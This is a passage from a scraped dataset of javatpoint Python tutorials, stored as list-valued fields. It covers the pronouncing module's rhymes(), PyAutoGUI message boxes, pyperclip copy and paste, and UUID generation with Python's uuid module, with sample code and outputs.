in the output."", ""The pronouncing module of Python is not an in-built module of Python which means that it doesn't come pre-installed in our system when we installed the Python source in our machine. This module requires to be installed externally, and that's why we have to perform an installation process for installing this module in our system. Like using this module, installing it is also very easy because we don't have any external dependencies for this module. We can install pronouncing module of Python using multiple installation processes but installing it using the pip installer method is the simplest and easiest one. Therefore, in this part, we are going to install this module using the pip installer method, and to use this installation method, we have to write down the following pip command in the command prompt shell of our system:"", ""After writing the installation command as mentioned above, we just have to press the 'enter' key, and the installation of the pronouncing module will begin. When the installation process of this module starts, we will have to wait for some time because completion of this module's installation will take a while."", ""As we can see, the pronouncing module of Python is now successfully installed in our system, and 'successfully installed' is displayed on the command prompt shell's screen. Now, we can import the pronouncing module in any Python program to use its functions and find out the rhyming words of a given word in the program using these functions."", ""Now, we will learn how this module functions and how we can use the functions of this module to find rhyming words of a given word. We will understand the implementation of this module by importing and using these functions in the example programs. We will use the functions of this module in the example program and find out the rhyming words of the word given in that example program. We will use this module's rhymes() function to carry out this operation. Following is the syntax of using the rhymes() function of the pronouncing module:"", ""Explanation: First, we have imported the pronouncing module as prn in the program to use this module's rhymes() function. After that, we used the rhymes() function and used the 'Shine' word in it so that all rhyming words related to the 'shine' word will be fetched. We have stored the result of this operation in the rhymResult variable so that we can use this variable to print the result. Lastly, we used the print statement with the rhymResult variable to print rhyming words related to 'Shine' in the output as a result of the operation performed in the function.""]","['pip install pronouncing', '>> pronouncing.rhymes(""GivenWord"")', '# Importing the pronouncing module', 'import pronouncing as prn', '# Using rhymes() for finding rhyming words', 'rhymResult = prn.rhymes(""Shine"")', '# Printing result in the output', 'print(""The rhyming words of the word Shine are: "")', 'print(rhymResult)', '# Importing the pronouncing module', 'import pronouncing as prn', '# Taking given word as input from the user', 'givenWord = input(""Please Enter a word to find its rhyming words: "")', '# Using rhymes() for finding rhyming words', 'oprResult = prn.rhymes(givenWord)', '# Printing result in the output', 'print(""The rhyming words of the word given by you are: "")', 'print(oprResult)']","['The rhyming words of the word Shine are:', ""['affine', 'align', 'aline', 'assign', 'barentine',  .. 'vine', 'whine', 'whine', 'wine', 'wyne', 'zine']"", 'Please enter a word to find its rhyming words: Meta', 'The rhyming words of the word given by you are:', ""['akita', 'alita', 'alvita', 'amelita', 'amezquita', ....., ita', 'tita', 'tomita', 'unita', 'velveeta', 'venita', 'vernita', 'vinita', 'yamashita', 'zita']""]",[],[]
457,['Python PyAutoGUI Module'],"[""We all have seen various message boxes while performing multiple tasks on different types of applications and websites. These message boxes are of different types, such as alert message box, confirm message box, password message box, and many other types. These different types of message boxes are meant for displaying a particular message from the website or application on which we are performing the given task. Like the confirm message box asking for the confirmation from the user working on a website or application, and this confirmation can be about anything such as submission of application, etc. Therefore, these message boxes become a very important part of an application or website, enhancing their delivery quality. These messages are part of an application's Graphical User Interface (GUI), and these come in-built with the application or website. These message boxes are specially created to convey some important messages to the user that require the user's attention on that message. These message boxes help the applications or websites grab the user's spot attention so that important messages from these applications or websites never be missed. Almost every application or website in today's time has the in-built feature of message boxes in their GUI, and that's why learning about these message boxes is becoming important in today's time.""]","['https://www.javatpoint.com/python-pyperclip-module', 'https://www.javatpoint.com/python-pronouncing-module', 'https://www.javatpoint.com/python-pyperclip-module', 'https://www.javatpoint.com/python-pronouncing-module', 'https://www.javatpoint.com/python-pyperclip-module']","['https://static.javatpoint.com/python/images/python-pyautogui-module.png', 'https://static.javatpoint.com/python/images/python-pyautogui-module2.png', 'https://static.javatpoint.com/python/images/python-pyautogui-module3.png', 'https://static.javatpoint.com/python/images/python-pyautogui-module4.png', 'https://static.javatpoint.com/python/images/python-pyautogui-module5.png', 'https://static.javatpoint.com/python/images/python-pyautogui-module6.png']",[],"['Introduction to PyAutoGUI Module of Python', 'PyAutoGUI Module of Python: Installation', 'PyAutoGUI Module of Python: Implementation']","['1) Alert Message Box:', '2) Confirmation Message Box:', '3) Multiple Option Message Box:', '4) Prompt (Enter) Message Box:', '5) Password Message Box:']",[],"['Look at the following example program to understand the implementation of the alert() function:', 'Example 1: Look at the following Python program where we have created an alert message box:', 'Look at the following example program to understand the implementation of the confirm() function:', 'Example 2: Look at the following Python program where we have created a confirmation message box:', 'Example 3: Look at the following Python program where we have created multiple options message box:', 'Example 4: Look at the following Python program where we have created a prompt message box:', 'Example 4: Look at the following Python program where we have created a password message box:']","['To perform the installation of the pyautogui module using the pip installer method, first, we have to write the following pip installation command in the terminal shell of our system:', ""Let's understand the implementation of those GUI functions of the pyautogui module, which we will use to create the message boxes given above by using them in example programs."", 'The pyautogui module has an alert() function, which we can use to create an alert message box by giving an input message in this function. Following is the syntax for using this function to create an alert message box:', 'Explanation: First, we have imported the pyautogui module into the program as pag. After that, we have used the alert() function to create an alert message box, and we have provided an input message which will be displayed in the alert message box.', 'The pyautogui module has confirm() function, which is used to create a confirmation message box by giving an input message in this function. Following is the syntax for using this function to create a confirmation message box:', ""As we can see, we have displayed a multiple options message box in the output using the confirm() function. That's how we can use the buttons argument in the confirm() function to create a multiple options message box."", ""As we can see, a prompt message box where we have entered the input message is shown in the output. That's how we can use the prompt() function of this module to create a prompt message box."", ""As we can see, a password message box where we have entered the password or input message is shown in the output. That's how we can use the password() function of this module to create a password message box.""]","['Many programming languages have in-built or extended packages which can be used to create such message boxes, and these message boxes can be embedded in the GUI of the application or website. One can use the functions of these packages offered by different programming languages to create different types of message boxes. Talking particularly about Python, it alone offers several libraries & packages which we can use to create message boxes for GUI of any application or website. One such Python package is the pyautogui module which comes with lots of in-built, and we can use these functions to create message boxes. Therefore, in this tutorial, we will learn about this pyautogui module of Python and learn to create message boxes using the functions of this module. We will use the functions of this module in the example programs of this tutorial to create sample message boxes.', 'The pyautogui module is a Python package that comes with multiple functions that can be used to automate the GUI of our system or machine. We can also use the functions of this module to automate the functioning of the keyboard and mouse of our system. Other than this, the pyautogui module also offers many other GUI functions which we can use to create message boxes for GUI of any application and website. This article only focuses on this functionality of the pyautogui module. It means that we will only talk and learn about these GUI functions (used to create message boxes) and learn about their implementation in this tutorial by using them in example programs. But, before we start learning about these functions, we have to first go through the installation part.', 'The pyautogui module of Python is not in-built, and therefore before we start learning about creating message boxes using the GUI functions of this module, we have to install this module in our system. We can use multiple ways to install the pyautogui module in our machine, but we will use the pip installer method to install this module. The major reason behind this is that the pip installer method is the simplest and easiest method to install this module, and we can install this module very quickly by using the pip installer method.', ""Once we are done with writing the command mentioned above in the terminal shell, we only have to press the 'enter', which will start the installation process of the pyautogui module. When the installation process of the pyautogui module start, we have to wait for a short time until all dependencies required for this module are successfully installed in our system."", 'As we can see, the installation process for the pyautogui module is finished, and it means that we have successfully installed this module in our system. Now, we can import this module into example programs to work with the functions of this module and understand their implementation.', ""Now, we will learn the functioning of the GUI functions of the pyautogui module by using them in the example programs of this part. We will understand the implementation of only those GUI functions of the pyautogui module, which are used to create a message box in the application or website's GUI. We will create different types of message boxes using various GUI functions of the pyautogui module. Following are the different types of message boxes that we will create using the GUI functions of the pyautogui module:"", ""As we can see, an alert message box with the input message is shown in the output, and when we click ok on the alert message box, we will exit from it. That's how we can use the alert() function of the pyautogui module to create an alert message box."", ""As we can see, a confirmation message box with the input message is shown in the output, and when we click ok on the confirm message box, we will exit from it. That's how we can use the confirm() function of the pyautogui module to create a confirmation message box."", 'We can also use the confirm() function of the pyautogui module to create a multiple options message box. We just have to provide the buttons argument inside the confirm() function to display the multiple options in the output message box. Look at the following example program to understand the multiple option functioning of the confirm() function:', 'We can also create a prompt message box where we can enter a personal message using the prompt() function of the pyautogui module. We can write any message in the prompt message box, which we will display in the output. The text we will enter in the output will be displayed in the output window if we press ok after entering a message, and if we press the cancel button, none will be displayed. Look at the following example program to understand the implementation of the prompt() function:', 'We can also create a password message box using the pyautogui module, and creating a password message box using this module is similar to creating the prompt message box. The pyautogui module has password() function, in which we create a password message box where the user will enter the password manually. The password or text entered in the password message box will be hidden. Look at the following example program to understand the implementation of the password() function:']","['pip install pyautogui', "">> alert('Message')"", '# Importing the pyautogui module', 'import pyautogui as pag', '# Creating an alert message box', ""pag.alert('Welcome to JavaTpoint! This is an alert message box')"", "">> confirm('Message')"", '# Importing the pyautogui module', 'import pyautogui as pag', '# Creating a confirmation message box', ""pag.confirm('Welcome to JavaTpoint! This is an example confirmation message box, and shall we proceed to next part?')"", '# Importing the pyautogui module', 'import pyautogui as pag', '# Creating a multiple options message box', ""pag.confirm('Welcome to JavaTpoint! This is a multiple option message box', buttons = ['Option A', 'Option B', 'Option C', 'Option D'])"", '# Importing the pyautogui module', 'import pyautogui as pag', '# Creating a prompt message box', ""pag.prompt('Welcome to JavaTpoint! Please Enter your Full Name:')"", '# Importing the pyautogui module', 'import pyautogui as pag', '# Creating a password message box', ""pag.password('Welcome to JavaTpoint! Please Enter your password:')""]",[],[],['|||Creating an alert message box|||Confirmation Message box|||Select message box|||Prompt message box|||Password message box|||']
458,['Python Pyperclip Module'],"[""It is obvious that many times in the past, we had required to copy or paste something, some text or message, from one place to another. Copy-paste is considered the simplest process, easiest, and time-saving process. It is very hard for us to imagine how much time we have to spend on our daily life if we have to write everything again & again instead of using the copy & paste option. Yes, it seems very difficult and irritating to not have copy & paste and write the same thing manually over and over again like many times. But thankfully, we have this option, thus saving lots of our time & energy, which we can optimize for performing other important tasks. Now, many of us here would start thinking that do we have more options for copy-paste other than the traditional copy-paste option. The answer to this question is a mixed response, and yes, we have other options available which we can use for copy-pasting something paperclip from one place to another. Many programming languages offer us packages and libraries that come in-built with the copy and paste options which we can use for copying and pasting a message or text from one place (application) to another. If we don't have the option to copy or paste a message traditionally, we can use these functions to carry out this task.""]","['https://www.javatpoint.com/how-to-generate-uuid-in-python', 'https://www.javatpoint.com/python-pyautogui-module', 'https://www.javatpoint.com/how-to-generate-uuid-in-python', 'https://www.javatpoint.com/python-pyautogui-module', 'https://www.javatpoint.com/how-to-generate-uuid-in-python']",['https://static.javatpoint.com/python/images/python-pyperclip-module.png'],[],"['Introduction to Pyperclip Module of Python', 'Pyperclip Module in Python: Installation', 'Pyperclip Module in Python: Implementation']",[],[],"['Look at the following example program to understand the implementation of the pyperclip module:', 'Example 1: Look at the following Python program where we have used the copy() and paste() function of the pyperclip module:', 'We can illustrate this feature of the pyperclip module by looking at the following example program:', 'Example 2: Look at the following Python program where we have copied an input int data-type text:']",[],"['Talking specifically about Python, it has a very rich library, and it comes with many modules and packages that have functions that can be used for carrying out the copy and paste task. Using these modules and their functions is very simple, and we can easily use the functions of these Python modules to perform the tasks that require copy-paste. One such Python module is the pyperclip module which is also very helpful for carrying out tasks that require the functioning of copy and paste. To understand more about this module, we will study and learn about this module in this tutorial. We will learn about its functions, installation, and working in this tutorial by importing this module into the example programs.', ""The Pyperclip is a cross-platform module of Python that comes with a lot of built-in functions, and we can use all these functions of the pyperclip module to carry out tasks that require copy-paste functioning. One great thing about this module is that it works perfectly with both versions of Python (Python 2 & Python 3). This is one of the biggest advantages of this module because many Python modules are not compatible with both versions of Python and work perfectly only with either one of these Python versions. The Pyperclip module of Python was created with the aim to provide the option of cross-platform copying and pasting of messages or texts. When we copy or send the program's output into the clipboard, it becomes very easy for us to paste it on multiple platforms like we can paste the output of the program on emails, multiple applications, word processors, and many other places using functions of this module. This increases the importance of this module in today's time when we are required to send the output of a given Python program to multiple applications. We will now move forward with this module and understand how this module works by using the functions of this module in the example programs of this tutorial."", 'In this part, we will learn about the installation process of the pyperclip module. The pyperclip module is not an in-built package of Python, and therefore, if we want to use functions of this module in the example programs, we have to perform the installation process of this module and install this module in our system. We have multiple options and methods which we can use to install the pyperclip module in our machine, but the pip installer method for installing this module is the easiest and simplest module. Therefore, we will use the pip installer method in this part to install the pyperclip module in our system, and only after this can we use functions of this module in example programs. First, we have to write the following pip command into the command prompt shell of our system to use the pip installation method:', ""After writing the pip command given above, we have to press the 'enter' to initiate the installation process of the pyperclip module. Once the installation process starts, it will take a while to install all the dependencies of this module in our system."", ""As we can see, the successfully installed message is now displayed on the screen, which means that the pyperclip module is successfully installed in our system. That's how we can install the pyperclip module of Python in our system using the pip installer method."", ""Since we have done with the installation part of the pyperclip module, it's time we should move forward with the implementation part of this module so we all can have a basic idea of how this module works and how we can use functions of this module in a Python program. The pyperclip module basically comes with two built-in functions: copy () and paste() functions. We can use both these functions to carry out all those tasks that require the copy & paste functioning by using them in the Python programs. Now, we will understand the functioning of this module by copying a user-input text into another variable using both these functions of the pyperclip module."", ""As we can see, the input given text in the program is successfully copied into the program, and the same text is printed in the output. That's how we can use the copy() and paste() function of the pyperclip module in any Python program to copy texts or messages from one place to another."", ""Explanation: We have first imported the pyperclip module as ppr in the example program to use the functions of this module in the program. After that, we have taken an input text from the user, which we will copy into the second variable of the program. We have then used the copy() function of the pyperclip module and provided the input text variable as an argument in the function. By providing this variable as an argument in the copy() function, the text present in this variable will be copied to the program's clipboard. Then, we have used the paste() function of this module to paste the copied text present in the clipboard into the second variable of the program. After the text from the input variable is successfully copied into the second variable, we have printed the text from the second variable to verify the same."", 'We have now learned how we can use the functions of this module to copy any text or message from one place or application to another. One thing which is more fascinated about this module is that irrespective of the data type of what we are copying, it will be converted into the string data type when we paste the copied message. This holds true for every data-type text that we will copy using the copy() and paste() function of this module.', ""As we can see, the input integer text is copied into the second variable, and the data type of this text is changed to the string data type. That's how we have illustrated the change in the data type of copied text using functions of the pyperclip module.""]","['pip install pyperclip', '# Importing the pyperclip module', 'import pyperclip as ppr', '# Taking an input text from the user', 'inputText = input(""Please provide an input text that will be copied into second variable: "")', ""# Copying the input text to the program's clipboard"", 'ppr.copy(inputText)', '# Pasting the copied text into the second variable', 'secVar = ppr.paste()', '# Printing the pasted text from clipboard in the output', 'print(""The text which is provided by you in the input variable: "", secVar)', '# Importing the pyperclip module', 'import pyperclip as ppr', '# Taking an input int data-type text from user', 'inputText = int(input(""Please provide an integer type input text that will be copied into second variable: ""))', ""# Copying the input text to program's clipboard"", 'ppr.copy(inputText)', '# Pasting the copied text into second variable', 'secVar = ppr.paste()', '# Printing the pasted text from clipboard in the output', 'print(""The text which is provided by you in the input variable: "", secVar)', '# Illustrating the data-type change by printing data-type of both variable', 'type1 = type(inputText)', 'print(""The data-type of input text provided by user: "", type1)', 'type2 = type(secVar)', 'print(""The data-type of text that is copied into second variable: "", type2)']","['Please provide an input text that will be copied into second variable: A Sample Text', 'The text which is provided by you in the input variable: A Sample Text', 'Please provide an integer type input text that will be copied into second variable: 524', 'The text which is provided by you in the input variable: 524', ""The data-type of input text provided by user: <class 'int'>"", ""The data-type of text that is copied into the second variable: <class 'str'>""]",[],[]
459,['How to Generate UUID in Python'],"[""In this tutorial, we will discuss how to generate the UUID in Python using the uuid module. Before diving into this topic, let's understand the basic concept of the UUID.""]","['https://www.javatpoint.com/python-top-10-libraries-to-learn-in-2022', 'https://www.javatpoint.com/python-pyperclip-module', 'https://www.javatpoint.com/python-top-10-libraries-to-learn-in-2022', 'https://www.javatpoint.com/python-pyperclip-module', 'https://www.javatpoint.com/python-top-10-libraries-to-learn-in-2022']",[],[],"['Introduction', 'When to use UUID', 'Python uuid Module', 'Generate UUID using Python UUID Module', 'uuid1() vs uuid4', 'UUID 3 and UUID 5 to Create a Name-Based UUID', 'How to convert string to UUID and UUID to string in Python?', 'Generate Reproducible UUIDs', 'Conclusion']","['Structure of UUID', 'The Behavior of uuid3 and uuid5', 'Reproduce UUID with seed']",[],"['The UUID module can be used in the following scenarios.', 'In Web Application -', 'In Database System', ""Let's generates the UUIDs of various versions using the Python uuid module."", ""Using uuid1() - To generate the uuid, we must import uuid module and then call uuid1() method. Let's understand the following example."", 'Example - 1', 'The UUID string representation is given below -', ""Let's break down the above fields of UUIDs"", ""Let's understand another example of generating UUID in various formats such as bytes, int, and hex."", 'Example - 2:', 'Disadvantages of UUID1', ""The UUID1 is associated with the computer's MAC address and hence can be a threat to privacy. However, it provides complete uniqueness."", 'Method 2: using uuid4()', ""This method generates the random numbers with the guarantee to secure privacy. Let's understand the following example."", 'The name-based UUID means we can generate UUIDs using version 3 or 5 UUID.', 'We can use names and namespaces to create a series of unique UUIDs. Version 3 and 5 is hashing namespace identifier with a name.', 'Below are the namespaces identifiers defined by the uuid3() or uuid5().', ""Let's understand the following example to generate UUID3 and UUID5 using the various hostname and namespace."", 'Example - 2: Generate UUID 3and UUID 5 using a different namespace', 'Example - 3', 'Now, we will create UUID from String.', 'Example - 2:', 'The following inputs can be used to create UUID instance.', ""Using any of above value, the UUID can be generated. Let's see the following example where we use all these value of the same UUID.""]","['As we can see that there are five components in the above UUID and each component has the same length. The structure of UUID is in the format of ""8-4-4-4-12"".', 'The uuid4() method generates random UUID by using the cryptographically generated secure number generators. It generates more secure UUIDs. It is recommended when UUIDs require generating on separate machines.', 'The uuid3() method generates a UUID that based on the MD5 hash of namespace identifier and a string. On the other hand, the uuid5() method generates UUID based on the SHA-1 hashing technique of a namespace identifier.', ""The uuid.uuid1() method returns the instance of UUID class. We can get string representation of UUID using the str() method. The corresponding string format can be used in comparison or manipulation. Let's understand the following example."", ""Sometimes, we get the UUID in string format. And our application needs to convert it in the UUID class instance for some applications. Let's understand the following example to convert string formatted UUID."", ""As its name suggests, the Faker module generates fake data for us. We have used the faker module to generate the same UUID repeatedly. Let's understand the following example.""]","['UUID is an abbreviation name of universally unique identifiers also known as GUID, i.e., Globally Unique Identifier. It is a 128 bits long ID number to uniquely define documents, users, resources, or information. There are various versions of UUIDs; we will discuss all of them in upcoming section.', 'Python uuid module is implemented as per RFC 4122, a standard and Copyright © of the internet society. With the help of the Python UUID module, we can generate UUIDs in various types such as 1, 3, 4, and 5 version UUIDs. Python module supports the following versions of UUID.', ""The uuid1() provides the assurance not to produce any collision. We can create duplicates of UUIDs by creating more than 16384 uuid1 in less than 100ns. It doesn't provide the guarantee to secure privacy. The uuid1() is not recommended if you don't wish to visible your machine's MAC addresses."", ""As we mentioned earlier, UUID has various attributes. We can use the same UUID using any of its attributes. Using the uuid module, we can generate the same uuid anytime using the seed value. The seed value can also be used to generate the same UUID. Let's understand both concepts."", 'In this tutorial, we have discussed uuid module in details and understand how we can generate the various UUIDs. UUIDs help us to define the uniqueness in the application/database and also help to define identifiers for documents, hosts, application, clients, and other situation.']","['import uuid', '# Printing random id using uuid1()', 'print (""The random generated uuid is : "", uuid.uuid1())', 'UUID = time_low ""-"" time_mid ""-""time_high_and_version "" ""clock_seq_and_reserved_And_clock_seq_low""-"" Node.', 'import uuid', 'id = uuid.uuid1()', '# Representations of uuid1()', 'print (""The byte Representations of uuid1() are : "")', 'print (repr(id.bytes))', 'print (""Integer Value Representation: "",end="""")', 'print(id.int)', 'print (""hex Value Representation : "",end="""")', 'print (id.hex)', 'print(""\\n"")', '# The components of uuid1()', 'print (""The components of uuid1() are : "")', 'print (""Version  : "",end="""")', 'print (id.version)', 'print (""Variant : "",end="""")', 'print (id.variant)', 'print(""\\n"")', '# Fields of uuid1()', 'print (""The Fields of uuid1() are : "")', 'print (""Fields  : "",end="""")', 'print (id.fields)', ""print('UUID.fields  :', id.fields)"", 'print(""Prining each field seperately"")', ""print('UUID.time_low            : ', id.time_low)"", ""print('UUID.time_mid            : ', id.time_mid)"", ""print('UUID.time_hi_version     : ', id.time_hi_version)"", ""print('UUID.clock_seq_hi_variant: ', id.clock_seq_hi_variant)"", ""print('UUID.clock_seq_low       : ', id.clock_seq_low)"", ""print('UUID.node                : ', id.node)"", ""print('UUID.time                : ', id.time)"", ""print('UUID.clock_seq           : ', id.clock_seq)"", ""print('UUID.SafeUUID           : ', id.is_safe)"", 'print(""\\n"")', '# The time Component of uuid1()', 'print (""The time Component of uuid1() is : "")', 'print (""Time component  : "",end="""")', 'print (id.node)', 'import uuid', 'id = uuid.uuid4()', '# Id generated using uuid4()', 'print (""The id generated using uuid4() : "",end="""")', 'print (id)', 'import uuid', ""host_names = ['javatpoint.com', 'tutorialandexample.com']"", 'for host in host_names:', ""print('Generate uuid 3 version using name as',host,' and namespace as uuid.NAMESPACE_DNS')"", 'print(uuid.uuid3(uuid.NAMESPACE_DNS, host))', ""print('Generate uuid 5 version using name as', host, ' and namespace as uuid.NAMESPACE_DNS'),"", 'print(uuid.uuid5(uuid.NAMESPACE_DNS, host))', 'print()', 'import uuid', 'name_spaces = [uuid.NAMESPACE_DNS, uuid.NAMESPACE_URL, uuid.NAMESPACE_OID, uuid.NAMESPACE_X500]', ""host_name = 'pynative.com'"", 'print(""Generate uuid using namespace"")', 'for namespace in name_spaces:', ""print('uuid 3 is', uuid.uuid3(namespace, host_name))"", ""print('uuid 5 is', uuid.uuid5(namespace, host_name))"", 'print()', 'import uuid', ""print('Generate version 3 uuid using name as pynative.com and namespace as uuid.NAMESPACE_DNS')"", 'print(uuid.uuid3(uuid.NAMESPACE_DNS, ""javatpoint.com""))', ""print('Generate version 3 uuid using name as pynative.com and namespace as uuid.NAMESPACE_DNS')"", 'print(uuid.uuid3(uuid.NAMESPACE_DNS, ""javatpoint.com""))', 'import uuid', 'UUID1_VAL = uuid.uuid1()', 'print(""The version 1 UUID is "", UUID1_VAL)', '# convert a UUID to a string of hex digits in standard form', 'print(""The version 1 UUID in String format"", str(UUID1_VAL))', '# Use replace() method to remove dashes from string', 'uuidString = str(UUID1).replace(""-"", """")', 'print(""Version 1 UUID in String removing dashes"", uuidString)', 'import uuid', 'import uuid', 'UUIDStrings = [""{c7c9de0a-d676-11e8-8d62-ccaf789d94a0}"", ""018c168c-d509-11e8-b096-ccaf789d94a0"", ""urn:uuid:e5e9394c-daed-498e-b9f3-69228b44fbfa""]', 'for string in UUIDStrings:', '# make a UUID from a string of hex digits (braces and hyphens ignored)', 'myUUID = uuid.UUID(string)', 'print(""My UUID is"", myUUID)', 'print(""My UUID time component is"", myUUID.time)', 'print()', 'import uuid', 'def display(message, l):', 'print(message)', 'for v in l:', 'print(v)', 'print()', 'string_uuids = [', ""'urn:uuid:f2f84497-b3bf-493a-bba9-7c68e6def80b',"", ""'{417a5ebb-01f7-4ed5-aeac-3d56cd5037b0}',"", ""'2115773a-5bf1-11dd-ab48-001ec200d9e0',"", ""display('string UUID', string_uuids)"", 'uuids = [ uuid.UUID(s) for s in string_uuids ]', ""display('converted to uuids', uuids)"", 'uuids.sort()', ""display('sorted value', uuids)"", 'import uuid', 'print(""Generating UUID from int"")', 'UUID_x = uuid.UUID(int=236357465324988601727440242910546465952)', 'print(""UUID is"", UUID_x)', 'print(""UUID from URN"")', ""UUID_x1 = uuid.UUID('urn:uuid:b1d0cac0-d50d-11e8-b57b-ccaf789d94a0')"", 'print(""UUID is"", UUID_x1)', 'print(""UUID from bytes"")', ""UUID_x2 = uuid.UUID(bytes=b'\\xb1\\xd0\\xca\\xc0\\xd5\\r\\x11\\xe8\\xb5{\\xcc\\xafx\\x9d\\x94\\xa0')"", 'print(""UUID is"", UUID_x2)', 'print(""UUID from bytes_len"")', ""UUID_x3 = uuid.UUID(bytes_le=b'\\xc0\\xca\\xd0\\xb1\\r\\xd5\\xe8\\x11\\xb5{\\xcc\\xafx\\x9d\\x94\\xa0')"", 'print(""UUID is"", UUID_x3)', 'print(""UUID from fields"")', 'UUID_x4 = uuid.UUID(fields=(2983250624, 54541, 4584, 181, 123, 225054014936224))', 'print(""UUID is"", UUID_x4)', 'import uuid', 'from faker import Faker', 'fake_obj = Faker()', 'fake_obj.seed(8754)', 'print(faker_obj.uuid4())', 'fake_obj.seed(8754)', 'print(fake_obj.uuid4())']","['The random id using uuid1() is :  ab2d0fc0-7224-11ec-8ef2-b658b885fb3', 'The byte Representations of uuid1() are :', ""b'\\xb9\\xea\\xb88s\\x0e\\x11\\xec\\xbfv\\x86\\xa0;\\xe4`\\x12'"", 'int Representation : 247125913120858544596828814248071421970', 'hex Representation : b9eab838730e11ecbf7686a03be46012', 'The Components of uuid1() are :', 'Version  : 1', 'Variant : specified in RFC 4122', 'The Fields of uuid1() are :', 'Fields  : (3119167544, 29454, 4588, 191, 118, 148022757711890)', 'The time Component of uuid1() is :', 'Time component  : 148022757711890', 'UUID.time_mid            :  29460', 'UUID.time_hi_version     :  4588', 'UUID.clock_seq_hi_variant:  186', 'UUID.clock_seq_low       :  100', 'UUID.node                :  90979746151630', 'UUID.time                :  138612218401246920', 'UUID.clock_seq           :  14948', 'UUID.SafeUUID           :  SafeUUID.unsafe', 'The id generated using uuid4() : 53967be6-71e9-4ee9-9912-60d02d2d9b0a', 'Generate uuid 3 version using name as javatpoint.com  and namespace as uuid.NAMESPACE_DNS', '98bbe92a-b38f-3289-a4b4-80ec1cfdf8cb', 'Generate uuid 5 version using name as javatpoint.com  and namespace as uuid.NAMESPACE_DNS', '0fc2d4dd-7194-5200-8050-f0ca1dd04b3d', 'Generate uuid 3 version using name as tutorialandexample.com  and namespace as uuid.NAMESPACE_DNS', '6f6fe445-1c4c-3874-854e-c79f617effe5', 'Generate uuid 5 version using name as tutorialandexample.com  and namespace as uuid.NAMESPACE_DNS', '781c3cc9-4965-5fdc-9c40-89bb0ea8ec0d', 'Generate uuid using namespace', 'uuid 3 is 6ddc8513-dc7b-3b37-b21b-a1ca9440fe14', 'uuid 5 is 8d6a1314-170a-559c-afe7-b68d1d7ee9ac', 'uuid 3 is 5dcfef3e-bcc9-38bc-b989-4a7516a05974', 'uuid 5 is 3a4a6c31-8d6a-5583-8497-d2ed90b1f13a', 'uuid 3 is 84d9730f-330f-3634-9542-4acfcdcd6c60', 'uuid 5 is 899f3d4b-6095-5ee6-9805-68e0c51dcb39', 'uuid 3 is b140fa3b-983a-3efe-85ef-92f07d5e09a0', 'uuid 5 is 73b723ef-5c5e-5eb4-8fcc-aabb5c4e7803', 'Generate version 3 uuid using name as pynative.com and namespace as uuid.NAMESPACE_DNS', '98bbe92a-b38f-3289-a4b4-80ec1cfdf8cb', 'Generate version 3 uuid using name as pynative.com and namespace as uuid.NAMESPACE_DNS', '98bbe92a-b38f-3289-a4b4-80ec1cfdf8cb', 'The version 1 UUID is  cdca7930-7488-11ec-a0c4-4984d2946471', 'UUID of version 1 in String format cdca7930-7488-11ec-a0c4-4984d2946471', 'Version 1 UUID in String format cdca7930-7488-11ec-a0c4-4984d2946471', 'Version 1 UUID in String removing dashes cdca7930748811eca0c44984d2946471', 'UUID is c7c9de0a-d676-11e8-8d62-ccaf789d94a0', 'Time component is 137595594281180682', 'UUID is 018c168c-d509-11e8-b096-ccaf789d94a0', 'Time component is 137594023292180108', 'UUID is e5e9394c-daed-498e-b9f3-69228b44fbfa', 'Time component is 688728508333635916', 'string UUID', 'urn:uuid:f2f84497-b3bf-493a-bba9-7c68e6def80b', '{417a5ebb-01f7-4ed5-aeac-3d56cd5037b0}', '2115773a-5bf1-11dd-ab48-001ec200d9e0', 'converted to uuids', 'f2f84497-b3bf-493a-bba9-7c68e6def80b', '417a5ebb-01f7-4ed5-aeac-3d56cd5037b0', '2115773a-5bf1-11dd-ab48-001ec200d9e0', 'sorted value', '2115773a-5bf1-11dd-ab48-001ec200d9e0', '417a5ebb-01f7-4ed5-aeac-3d56cd5037b0', 'f2f84497-b3bf-493a-bba9-7c68e6def80b', 'Generating UUID from int', 'UUID is b1d0cac0-d50d-11e8-b57b-ccaf789d94a0', 'UUID from URN', 'UUID is b1d0cac0-d50d-11e8-b57b-ccaf789d94a0', 'UUID from bytes', 'UUID is b1d0cac0-d50d-11e8-b57b-ccaf789d94a0', 'UUID from bytes_len', 'UUID is b1d0cac0-d50d-11e8-b57b-ccaf789d94a0', 'UUID from fields', 'UUID is b1d0cac0-d50d-11e8-b57b-ccaf789d94a0', 'b1d0cac0-d50d-11e8-b57b-ccaf789d94a0', 'b1d0cac0-d50d-11e8-b57b-ccaf789d94a0']",[],"['|||The UUID is used to define unique identifiers across space and time. Space and time mean that once the UUID is generated according to the standard, identifiers cannot be duplicate existing resources.|||The UUID is the most suitable option when uniqueness is required.|||It plays an essential role in cryptography and hashing application.||||||The UUID helps us to manage the state by generating a unique session id.|||Generally, we use the auto-increment values to generate user ids. It is quite a straightforward approach and easy to guess. However, UUIDs are difficult to guess because they are not created consecutively.||||||It provides a significant advantage in the database because UUID is environment-independent. It means we can create a UUID on any machine using any application.|||Most applications depend upon the database server to generate the unique or primary key. UUID is a good option to generate a unique database key which helps us change the key generation approach in the database.|||The UUID is a real value, not a pseudo value like a number in an SQL table.||||||UUID1 - It generates the unique number using the MAC address and current time component.|||UUID4 - It uses pseudo-random number generators to generate UUIDs, and such types UUIDs are good to use for the safety purpose.|||UUID3 and UUID5 - It uses cryptographic hashing and application-provided text strings to generate UUID.||||||time_low - It is a first 32 bits of id.|||time_mid - It is next 16 bits of id.|||time_high_and_version - It is a next 16 bits of id.|||clock_seq_hi_variant :It is a next 8 bits of id.|||clock_seq_low :It is a next 8 bits of id.|||node :It is a last 48 bits of id.|||time :It is a time component field of id.|||clock_seq :It is a 14 bit sequence number.||||||NAMESPACE_DNS - It represents a traditional domain name. For example, https://javatpoint.com.|||NAMESPACE_URL - It represents a URL.|||NAMESPACE_OID - This namespace is specified the string ISO OID.|||NAMESPACE_X500 - When this namespace is specified, the name string is an X.500 DN in DER or a text output format.||||||Despite the same namespace and same name are similar, UUIDs generated at a different times.|||Two different namespace in the same namespace are different, it generates the unique Ids.||||||String|||Bytes|||Bytes_le|||Fields|||int|||']"
